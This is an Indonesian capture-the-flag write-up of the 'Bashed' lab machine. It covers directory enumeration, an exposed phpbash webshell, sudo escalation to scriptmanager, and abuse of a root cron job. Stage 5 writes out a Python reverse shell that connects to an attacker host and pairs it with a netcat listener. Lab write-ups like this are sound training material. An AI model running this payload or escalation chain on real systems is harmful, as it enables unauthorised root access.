## **Informasi Mesin**

- **Nama**: Bashed
    
- **Sistem Operasi**: Linux
    
- **Tingkat Kesulitan**: Easy
    
- **Alamat IP**: 10.10.10.68
    

## **Tahap 1: Enumerasi Awal**

### **Directory Enumeration**

Menggunakan feroxbuster untuk memetakan direktori web:

```bash
feroxbuster -u http://10.10.10.68/ -w directory-list-2.3-medium.txt -t 50 --filter-status 404,400 -x php,txt
```

**Hasil:** Ditemukan direktori `/dev` yang dapat diakses.

## **Tahap 2: Akses Awal (Initial Foothold)**

### **Webshell Discovery**

Pada direktori `/dev` ditemukan file `phpbash.php` yang merupakan webshell sederhana.

**Akses Webshell:**
```text
http://10.10.10.68/dev/phpbash.php
```

### **Shell sebagai www-data**

Berhasil mendapatkan akses shell sebagai user `www-data` melalui webshell.

### **User Flag**

```bash
cat /home/arrexel/user.txt
```

Flag user berhasil diperoleh.

## **Tahap 3: Eskalasi ke Scriptmanager**

### **Privilege Escalation Check**

```bash
sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager) NOPASSWD: /bin/bash
```

### **Eskalasi ke Scriptmanager**

```bash
sudo -u scriptmanager /bin/bash
```

Berhasil mendapatkan akses sebagai user `scriptmanager`.

## **Tahap 4: Analisis dan Eksploitasi Cron Job**

### **Process Monitoring**

Menggunakan `pspy` untuk memantau proses yang berjalan:

```bash
./pspy64
```

**Temuan:** Setiap menit, root menjalankan perintah:

```bash
cd /scripts; for f in *.py; do python "$f"; done
```

### **Analisis Direktori /scripts**

```bash
ls -la /scripts
```

User `scriptmanager` memiliki hak tulis pada direktori `/scripts`.

## **Tahap 5: Eskalasi ke Root**

### **Membuat Reverse Shell Python**

Membuat file Python di `/scripts/`:

```bash
echo 'import socket,os,pty
s=socket.socket()
s.connect(("10.10.14.24",1339))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")' > /scripts/greed.py
```

### **Setup Listener**

Pada mesin attacker:

```bash
nc -lvnp 1339
```

### **Eksekusi Otomatis**

Setelah menunggu cron job dieksekusi oleh root (maksimal 1 menit), reverse shell berhasil terkoneksi sebagai root.

### **Root Flag**
```bash
cat /root/root.txt
```

Flag root berhasil diperoleh.